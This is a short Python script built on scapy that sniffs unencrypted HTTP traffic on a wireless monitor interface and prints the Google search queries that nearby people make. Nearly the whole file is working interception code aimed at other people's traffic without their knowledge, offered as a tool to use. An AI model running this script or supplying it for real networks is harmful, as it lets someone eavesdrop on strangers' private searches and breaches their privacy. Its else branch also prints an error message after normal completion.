#!/usr/bin/env python
#Author: Vaibhav Murkute

from scapy.all import *
import re
import argparse

def Main():
    parser = argparse.ArgumentParser("Sniff Google Searches around you.")
    parser.add_argument('-i','--iface', type=str, help='mon interface name for sniffing traffic')
    args = parser.parse_args()

    conf.iface = args.iface
    #conf.iface = 'wlan0mon'
    try:
        print '[+] Sniffing Google Searches around you..'
        sniff(iface=args.iface, filter='tcp port 80', prn=sniffGoogle) 
    
    except KeyboardInterrupt:
        exit(0)
    else:
        print 'Error Occured'
        exit(0)


def sniffGoogle(pkt):
    if pkt.haslayer(Raw):
        sniffedData = pkt.getlayer(Raw).load

        if 'GET' in sniffedData and 'google' in sniffedData:
            query = re.findall(r'(?i)\q=(.*?)\&',sniffedData)

            if query:
                search = query[0].split('&')[0]
                search = search.replace('q=','').replace('+',' ').replace('%20',' ')

                print "Searched for: "+ search

if __name__ == '__main__':
    Main()


        
